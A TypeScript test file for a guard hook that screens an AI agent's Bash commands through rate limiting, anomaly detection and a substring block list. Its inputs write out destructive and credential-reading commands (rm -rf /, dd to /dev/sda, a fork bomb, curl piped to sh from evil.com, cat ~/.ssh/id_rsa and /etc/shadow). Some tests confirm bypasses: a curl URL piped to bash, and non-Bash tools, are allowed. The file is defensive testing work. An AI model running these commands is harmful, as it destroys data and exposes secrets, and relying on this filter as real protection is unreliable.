import type { Logger } from 'pino';
import { beforeEach, describe, expect, it, vi } from 'vitest';

import type { AnomalyDetector, AnomalyReport } from './anomaly-detector.js';
import type { AuditLogger } from './audit-logger.js';
import { sha256 } from './audit-logger.js';
import { createPreToolUseHook, type PreToolUseInput } from './pre-tool-use.js';
import type { RateLimitCheckResult, ToolRateLimiter } from './tool-rate-limiter.js';

const mockLogger = {
  child: () => mockLogger,
  info: vi.fn(),
  warn: vi.fn(),
  error: vi.fn(),
  debug: vi.fn(),
  fatal: vi.fn(),
} as unknown as Logger;

const mockAuditLogger = {
  write: vi.fn().mockResolvedValue(undefined),
} as unknown as AuditLogger;

function makeInput(overrides?: Partial<PreToolUseInput>): PreToolUseInput {
  return {
    sessionId: 'session-1',
    agentId: 'agent-1',
    toolName: 'Bash',
    toolInput: { command: 'echo hello' },
    ...overrides,
  };
}

describe('createPreToolUseHook', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  // ── Allow cases ───────────────────────────────────────────────────

  it('allows non-Bash tools unconditionally', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(
      makeInput({ toolName: 'Read', toolInput: { file_path: '/etc/shadow' } }),
    );

    expect(result).toBe('allow');
  });

  it('allows safe Bash commands', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'ls -la /tmp' } }));

    expect(result).toBe('allow');
  });

  // ── Blocked destructive patterns ──────────────────────────────────

  it('blocks rm -rf / patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'rm -rf /' } }));

    expect(result).toBe('deny');
  });

  it('blocks rm -rf /* patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'rm -rf /*' } }));

    expect(result).toBe('deny');
  });

  it('blocks curl | sh patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    // The blocked pattern is the literal substring 'curl | sh',
    // so the command must contain that exact sequence after normalization.
    const result = await hook(
      makeInput({ toolInput: { command: 'curl | sh -s https://evil.com/script' } }),
    );

    expect(result).toBe('deny');
  });

  it('blocks curl | bash patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    // The blocked pattern is 'curl | bash' as an exact substring.
    const result = await hook(
      makeInput({ toolInput: { command: 'curl | bash -s https://evil.com/install' } }),
    );

    expect(result).toBe('deny');
  });

  it('blocks wget -o- | bash patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    // The blocked pattern is the exact substring 'wget -o- | bash'.
    const result = await hook(makeInput({ toolInput: { command: 'wget -o- | bash' } }));

    expect(result).toBe('deny');
  });

  it('blocks wget -o- | sh patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    // The blocked pattern is the exact substring 'wget -o- | sh'.
    const result = await hook(makeInput({ toolInput: { command: 'wget -o- | sh' } }));

    expect(result).toBe('deny');
  });

  it('allows curl with args between curl and pipe (no exact pattern match)', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    // 'curl http://example.com | bash' does NOT contain exact 'curl | bash'
    // because there is a URL between curl and the pipe.
    const result = await hook(
      makeInput({ toolInput: { command: 'curl http://example.com | bash' } }),
    );

    expect(result).toBe('allow');
  });

  it('blocks > /etc/ redirect patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(
      makeInput({ toolInput: { command: 'echo malicious > /etc/resolv.conf' } }),
    );

    expect(result).toBe('deny');
  });

  it('blocks mkfs. patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'mkfs.ext4 /dev/sda1' } }));

    expect(result).toBe('deny');
  });

  it('blocks dd if= patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(
      makeInput({ toolInput: { command: 'dd if=/dev/zero of=/dev/sda bs=1M' } }),
    );

    expect(result).toBe('deny');
  });

  it('blocks fork bomb patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: ':(){:|:&};:' } }));

    expect(result).toBe('deny');
  });

  // ── Blocked secret access patterns ────────────────────────────────

  it('blocks secret file access patterns (cat ~/.ssh)', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'cat ~/.ssh/id_rsa' } }));

    expect(result).toBe('deny');
  });

  it('blocks cat ~/.aws patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'cat ~/.aws/credentials' } }));

    expect(result).toBe('deny');
  });

  it('blocks cat ~/.gnupg patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'cat ~/.gnupg/secring.gpg' } }));

    expect(result).toBe('deny');
  });

  it('blocks cat /etc/shadow patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'cat /etc/shadow' } }));

    expect(result).toBe('deny');
  });

  it('blocks cat /etc/passwd patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'cat /etc/passwd' } }));

    expect(result).toBe('deny');
  });

  // ── Normalisation ─────────────────────────────────────────────────

  it('pattern matching is case-insensitive', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'RM -RF /' } }));

    expect(result).toBe('deny');
  });

  it('collapses multiple whitespace before pattern matching', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'rm   -rf    /' } }));

    expect(result).toBe('deny');
  });

  it('handles mixed case with extra whitespace', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'Cat   ~/.SSH/id_rsa' } }));

    expect(result).toBe('deny');
  });

  // ── Edge cases ────────────────────────────────────────────────────

  describe('edge cases', () => {
    it('handles empty command string', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      const result = await hook(makeInput({ toolInput: { command: '' } }));

      expect(result).toBe('allow');
    });

    it('handles non-string command in toolInput (defaults to empty string)', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      const result = await hook(
        makeInput({ toolInput: { command: 123 } as unknown as Record<string, unknown> }),
      );

      expect(result).toBe('allow');
    });

    it('handles missing command key in toolInput', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      const result = await hook(makeInput({ toolInput: {} }));

      expect(result).toBe('allow');
    });

    it('only matches the first blocked pattern (breaks after first match)', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      // This command contains both 'rm -rf /' and 'curl | sh'
      const result = await hook(makeInput({ toolInput: { command: 'rm -rf / && curl | sh' } }));

      expect(result).toBe('deny');

      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];

      // Should report the first matched pattern (rm -rf /)
      expect(entry.denyReason).toContain('rm -rf /');
    });

    it('allows Bash commands that partially resemble blocked patterns', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      // "rm -rf /tmp" does not contain "rm -rf /" as a pattern match
      // because "rm -rf /tmp" contains "rm -rf /" as substring — it should still deny.
      // Actually, "rm -rf /tmp" includes the substring "rm -rf /" so it will be denied.
      const result = await hook(makeInput({ toolInput: { command: 'rm -rf /tmp' } }));

      // This is actually denied because 'rm -rf /tmp' contains 'rm -rf /'
      expect(result).toBe('deny');
    });

    it('allows rm commands that do not match destructive patterns', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      // "rm file.txt" does not contain any blocked pattern
      const result = await hook(makeInput({ toolInput: { command: 'rm file.txt' } }));

      expect(result).toBe('allow');
    });
  });

  // ── Audit log entries ─────────────────────────────────────────────

  describe('audit log entries', () => {
    it('writes audit log entry on allow', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      await hook(makeInput({ toolInput: { command: 'echo safe' } }));

      expect(mockAuditLogger.write).toHaveBeenCalledTimes(1);

      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];

      expect(entry.kind).toBe('pre_tool_use');
      expect(entry.decision).toBe('allow');
      expect(entry.sessionId).toBe('session-1');
      expect(entry.agentId).toBe('agent-1');
      expect(entry.tool).toBe('Bash');
      expect(entry).not.toHaveProperty('denyReason');
    });

    it('writes audit log entry with denyReason on deny', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      await hook(makeInput({ toolInput: { command: 'rm -rf /' } }));

      expect(mockAuditLogger.write).toHaveBeenCalledTimes(1);

      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];

      expect(entry.kind).toBe('pre_tool_use');
      expect(entry.decision).toBe('deny');
      expect(entry.denyReason).toContain('rm -rf /');
    });

    it('includes inputHash computed from toolInput', async () => {
      const toolInput = { command: 'echo hello' };
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      await hook(makeInput({ toolInput }));

      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];

      expect(entry.inputHash).toBe(sha256(toolInput));
    });

    it('includes an ISO 8601 timestamp', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      await hook(makeInput());

      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];

      expect(typeof entry.timestamp).toBe('string');
      expect(new Date(entry.timestamp).toISOString()).toBe(entry.timestamp);
    });

    it('always writes an audit entry even for non-Bash tools', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      await hook(makeInput({ toolName: 'Glob', toolInput: { pattern: '**/*.ts' } }));

      expect(mockAuditLogger.write).toHaveBeenCalledTimes(1);

      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];

      expect(entry.tool).toBe('Glob');
      expect(entry.decision).toBe('allow');
    });
  });

  // ── Logger calls ──────────────────────────────────────────────────

  describe('logger calls', () => {
    it('logs debug on allow', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      await hook(makeInput({ toolInput: { command: 'echo safe' } }));

      expect(mockLogger.debug).toHaveBeenCalledWith(
        expect.objectContaining({
          agentId: 'agent-1',
          sessionId: 'session-1',
          tool: 'Bash',
        }),
        'Tool use allowed',
      );
    });

    it('logs warn on deny', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      await hook(makeInput({ toolInput: { command: 'rm -rf /' } }));

      expect(mockLogger.warn).toHaveBeenCalledWith(
        expect.objectContaining({
          agentId: 'agent-1',
          sessionId: 'session-1',
          tool: 'Bash',
          pattern: 'rm -rf /',
        }),
        'Dangerous command blocked',
      );
    });

    it('does not log debug on deny (only warn)', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      await hook(makeInput({ toolInput: { command: 'rm -rf /' } }));

      // The debug call for 'Tool use allowed' should NOT have been made
      expect(mockLogger.debug).not.toHaveBeenCalledWith(expect.anything(), 'Tool use allowed');
    });
  });

  // ── Error handling ────────────────────────────────────────────────

  describe('error handling', () => {
    it('propagates audit logger write errors', async () => {
      const failingAuditLogger = {
        write: vi.fn().mockRejectedValue(new Error('Disk full')),
      } as unknown as AuditLogger;

      const hook = createPreToolUseHook({
        auditLogger: failingAuditLogger,
        logger: mockLogger,
      });

      await expect(hook(makeInput())).rejects.toThrow('Disk full');
    });
  });

  // ── Multiple invocations ──────────────────────────────────────────

  describe('multiple invocations', () => {
    it('can be called multiple times with different inputs', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      const r1 = await hook(makeInput({ toolInput: { command: 'echo safe' } }));
      const r2 = await hook(makeInput({ toolInput: { command: 'rm -rf /' } }));
      const r3 = await hook(
        makeInput({ toolName: 'Read', toolInput: { file_path: '/etc/shadow' } }),
      );

      expect(r1).toBe('allow');
      expect(r2).toBe('deny');
      expect(r3).toBe('allow'); // Read is not Bash, so it's allowed
      expect(mockAuditLogger.write).toHaveBeenCalledTimes(3);
    });
  });

  // ── Layer 1: Rate limiting ──────────────────────────────────────

  describe('rate limiting (layer 1)', () => {
    function makeRateLimiter(overrides?: Partial<RateLimitCheckResult>): ToolRateLimiter {
      return {
        check: vi.fn().mockReturnValue({
          allowed: true,
          remaining: 10,
          resetAt: new Date('2026-01-01T00:00:00Z'),
          ...overrides,
        }),
        reset: vi.fn(),
        getStats: vi.fn(),
      } as unknown as ToolRateLimiter;
    }

    it('allows the call when rateLimiter.check returns allowed: true', async () => {
      const rateLimiter = makeRateLimiter({ allowed: true });
      const hook = createPreToolUseHook({
        auditLogger: mockAuditLogger,
        logger: mockLogger,
        rateLimiter,
      });

      const result = await hook(makeInput({ toolInput: { command: 'echo hello' } }));

      expect(result).toBe('allow');
      expect(rateLimiter.check).toHaveBeenCalledWith('agent-1', 'Bash');
    });

    it('denies the call when rateLimiter.check returns allowed: false', async () => {
      const resetAt = new Date('2026-03-03T12:00:00Z');
      const rateLimiter = makeRateLimiter({
        allowed: false,
        remaining: 0,
        resetAt,
        exceededLimit: 'per_minute',
      });
      const hook = createPreToolUseHook({
        auditLogger: mockAuditLogger,
        logger: mockLogger,
        rateLimiter,
      });

      const result = await hook(makeInput({ toolInput: { command: 'echo hello' } }));

      expect(result).toBe('deny');
    });

    it('deny reason includes exceededLimit and resetAt', async () => {
      const resetAt = new Date('2026-03-03T14:30:00Z');
      const rateLimiter = makeRateLimiter({
        allowed: false,
        remaining: 0,
        resetAt,
        exceededLimit: 'per_hour',
      });
      const hook = createPreToolUseHook({
        auditLogger: mockAuditLogger,
        logger: mockLogger,
        rateLimiter,
      });

      await hook(makeInput());

      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];

      expect(entry.decision).toBe('deny');
      expect(entry.denyReason).toContain('per_hour');
      expect(entry.denyReason).toContain(resetAt.toISOString());
    });

    it('rate-limited call skips anomaly detection and pattern matching', async () => {
      const resetAt = new Date('2026-03-03T14:30:00Z');
      const rateLimiter = makeRateLimiter({
        allowed: false,
        remaining: 0,
        resetAt,
        exceededLimit: 'per_minute',
      });
      const anomalyDetector = {
        recordCall: vi.fn().mockReturnValue([]),
      } as unknown as AnomalyDetector;
      const hook = createPreToolUseHook({
        auditLogger: mockAuditLogger,
        logger: mockLogger,
        rateLimiter,
        anomalyDetector,
      });

      // Even with a dangerous command, the rate limit fires first
      const result = await hook(makeInput({ toolInput: { command: 'rm -rf /' } }));

      expect(result).toBe('deny');
      // Anomaly detector should not have been called
      expect(anomalyDetector.recordCall).not.toHaveBeenCalled();
      // The deny reason should be about rate limiting, not pattern matching
      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];
      expect(entry.denyReason).toContain('Rate limit exceeded');
    });
  });

  // ── Layer 2: Anomaly detection ─────────────────────────────────

  describe('anomaly detection (layer 2)', () => {
    function makeAnomalyDetector(anomalies: AnomalyReport[]): AnomalyDetector {
      return {
        recordCall: vi.fn().mockReturnValue(anomalies),
        getBaseline: vi.fn(),
        reset: vi.fn(),
      } as unknown as AnomalyDetector;
    }

    it('allows when anomalyDetector returns no anomalies', async () => {
      const anomalyDetector = makeAnomalyDetector([]);
      const hook = createPreToolUseHook({
        auditLogger: mockAuditLogger,
        logger: mockLogger,
        anomalyDetector,
      });

      const result = await hook(makeInput({ toolInput: { command: 'echo safe' } }));

      expect(result).toBe('allow');
      expect(anomalyDetector.recordCall).toHaveBeenCalledWith('agent-1', 'Bash');
    });

    it('denies when anomalyDetector returns a high-severity anomaly', async () => {
      const anomalyDetector = makeAnomalyDetector([
        {
          type: 'frequency_spike',
          severity: 'high',
          message: 'Spike detected',
          agentId: 'agent-1',
          tool: 'Bash',
          detectedAt: new Date().toISOString(),
        },
      ]);
      const hook = createPreToolUseHook({
        auditLogger: mockAuditLogger,
        logger: mockLogger,
        anomalyDetector,
      });

      const result = await hook(makeInput({ toolInput: { command: 'echo safe' } }));

      expect(result).toBe('deny');
      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];
      expect(entry.denyReason).toContain('Anomaly detected');
      expect(entry.denyReason).toContain('Spike detected');
    });

    it('allows but logs warning for medium-severity anomaly', async () => {
      const anomalyDetector = makeAnomalyDetector([
        {
          type: 'new_tool',
          severity: 'medium',
          message: 'New tool usage detected',
          agentId: 'agent-1',
          tool: 'Bash',
          detectedAt: new Date().toISOString(),
        },
      ]);
      const hook = createPreToolUseHook({
        auditLogger: mockAuditLogger,
        logger: mockLogger,
        anomalyDetector,
      });

      const result = await hook(makeInput({ toolInput: { command: 'echo safe' } }));

      expect(result).toBe('allow');
      expect(mockLogger.warn).toHaveBeenCalledWith(
        expect.objectContaining({
          anomalyType: 'new_tool',
          anomalySeverity: 'medium',
        }),
        expect.stringContaining('Anomaly detected'),
      );
    });

    it('allows and logs info for low-severity anomaly', async () => {
      const anomalyDetector = makeAnomalyDetector([
        {
          type: 'new_tool',
          severity: 'low',
          message: 'Minor anomaly',
          agentId: 'agent-1',
          tool: 'Bash',
          detectedAt: new Date().toISOString(),
        },
      ]);
      const hook = createPreToolUseHook({
        auditLogger: mockAuditLogger,
        logger: mockLogger,
        anomalyDetector,
      });

      const result = await hook(makeInput({ toolInput: { command: 'echo safe' } }));

      expect(result).toBe('allow');
      expect(mockLogger.info).toHaveBeenCalledWith(
        expect.objectContaining({
          anomalyType: 'new_tool',
          anomalySeverity: 'low',
        }),
        expect.stringContaining('Anomaly detected'),
      );
    });

    it('denies when multiple anomalies include at least one high severity', async () => {
      const anomalyDetector = makeAnomalyDetector([
        {
          type: 'new_tool',
          severity: 'low',
          message: 'Low anomaly',
          agentId: 'agent-1',
          tool: 'Bash',
          detectedAt: new Date().toISOString(),
        },
        {
          type: 'frequency_spike',
          severity: 'high',
          message: 'High anomaly',
          agentId: 'agent-1',
          tool: 'Bash',
          detectedAt: new Date().toISOString(),
        },
      ]);
      const hook = createPreToolUseHook({
        auditLogger: mockAuditLogger,
        logger: mockLogger,
        anomalyDetector,
      });

      const result = await hook(makeInput({ toolInput: { command: 'echo safe' } }));

      expect(result).toBe('deny');
    });

    it('anomaly-denied call skips pattern matching', async () => {
      const anomalyDetector = makeAnomalyDetector([
        {
          type: 'frequency_spike',
          severity: 'high',
          message: 'High anomaly blocks',
          agentId: 'agent-1',
          tool: 'Bash',
          detectedAt: new Date().toISOString(),
        },
      ]);
      const hook = createPreToolUseHook({
        auditLogger: mockAuditLogger,
        logger: mockLogger,
        anomalyDetector,
      });

      // Dangerous command, but anomaly detection denies first
      const result = await hook(makeInput({ toolInput: { command: 'rm -rf /' } }));

      expect(result).toBe('deny');
      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];
      // Deny reason should reference anomaly, not pattern
      expect(entry.denyReason).toContain('Anomaly detected');
      expect(entry.denyReason).not.toContain('Blocked pattern');
    });
  });

  // ── Layer 3: Pattern matching — additional coverage ────────────

  describe('pattern matching (layer 3) — non-Bash tools', () => {
    it('non-Bash tools skip pattern matching even with dangerous input', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      // This tool input contains a dangerous command, but tool is not Bash
      const result = await hook(
        makeInput({ toolName: 'Write', toolInput: { command: 'rm -rf /' } }),
      );

      expect(result).toBe('allow');
    });

    it('non-Bash tools skip pattern matching with cat secret patterns', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      const result = await hook(
        makeInput({ toolName: 'Edit', toolInput: { command: 'cat ~/.ssh/id_rsa' } }),
      );

      expect(result).toBe('allow');
    });
  });

  // ── Audit entry structure verification ──────────────────────────

  describe('audit entry structure', () => {
    it('audit entry for allow contains all required fields', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      await hook(makeInput());

      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];

      expect(entry).toHaveProperty('kind', 'pre_tool_use');
      expect(entry).toHaveProperty('timestamp');
      expect(entry).toHaveProperty('sessionId', 'session-1');
      expect(entry).toHaveProperty('agentId', 'agent-1');
      expect(entry).toHaveProperty('tool', 'Bash');
      expect(entry).toHaveProperty('inputHash');
      expect(entry).toHaveProperty('decision', 'allow');
      expect(entry).not.toHaveProperty('denyReason');
    });

    it('audit entry for deny contains all required fields including denyReason', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      await hook(makeInput({ toolInput: { command: 'rm -rf /' } }));

      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];

      expect(entry).toHaveProperty('kind', 'pre_tool_use');
      expect(entry).toHaveProperty('timestamp');
      expect(entry).toHaveProperty('sessionId', 'session-1');
      expect(entry).toHaveProperty('agentId', 'agent-1');
      expect(entry).toHaveProperty('tool', 'Bash');
      expect(entry).toHaveProperty('inputHash');
      expect(entry).toHaveProperty('decision', 'deny');
      expect(entry).toHaveProperty('denyReason');
      expect(typeof entry.denyReason).toBe('string');
    });

    it('audit entry for rate-limited deny contains rate limit information', async () => {
      const resetAt = new Date('2026-06-01T00:00:00Z');
      const rateLimiter = {
        check: vi.fn().mockReturnValue({
          allowed: false,
          remaining: 0,
          resetAt,
          exceededLimit: 'per_minute',
        }),
      } as unknown as ToolRateLimiter;
      const hook = createPreToolUseHook({
        auditLogger: mockAuditLogger,
        logger: mockLogger,
        rateLimiter,
      });

      await hook(makeInput());

      const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];

      expect(entry.kind).toBe('pre_tool_use');
      expect(entry.decision).toBe('deny');
      expect(entry.denyReason).toContain('Rate limit exceeded');
      expect(entry.denyReason).toContain('per_minute');
      expect(entry.denyReason).toContain(resetAt.toISOString());
    });

    it('audit entry is written for every call regardless of outcome', async () => {
      const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

      // allow
      await hook(makeInput({ toolInput: { command: 'echo safe' } }));
      // deny
      await hook(makeInput({ toolInput: { command: 'rm -rf /' } }));
      // allow (non-Bash)
      await hook(makeInput({ toolName: 'Read', toolInput: { file_path: '/foo' } }));

      expect(mockAuditLogger.write).toHaveBeenCalledTimes(3);
    });
  });
});
